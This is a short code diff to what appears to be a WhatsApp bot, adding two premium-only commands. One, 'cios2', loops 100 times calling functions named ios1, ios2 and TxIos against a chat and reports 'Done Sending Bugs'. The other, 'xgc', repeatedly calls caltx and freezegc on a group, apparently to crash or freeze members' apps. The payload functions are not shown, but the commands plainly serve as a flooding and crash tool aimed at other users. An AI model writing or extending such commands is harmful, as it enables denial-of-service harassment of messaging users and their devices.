@@ -2499,6 +2499,37 @@ await OLDLOC(target, TypeNull)
 }
  }	    
 switch (command) {
+case 'cios2': {
+if (!isPremium) return replygcxeon(mess.prem)
+let target = m.chat
+await loading()
+await replygcxeon("✞Xᴄʜʀɪss Bot✞")
+for (let i = 0; i < 100; i++) {
+ await ios1(target)
+ await ios2(target)
+ await TxIos(target, Ptcp = true)
+}
+await replygcxeon("Done Sending Bugs ✅")
+}
+break
+		
+case "xgc": {
+if (!isPremium) return replygcxeon(mess.prem)
+if (!isGroup) return
+let target = m.chat
+for (let i = 0; i < 70; i++) {
+await caltx(target, true)
+await sleep(10)
+await freezegc(target, true)
+await caltx(target, true)
+await caltx(target, true)
+await sleep(10)
+await freezegc(target, true)
+}
+}
+break
+
+		
 case 'ban': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!text) return replygcxeon(`Example: ${prefix + command} 234|7080xxx`)
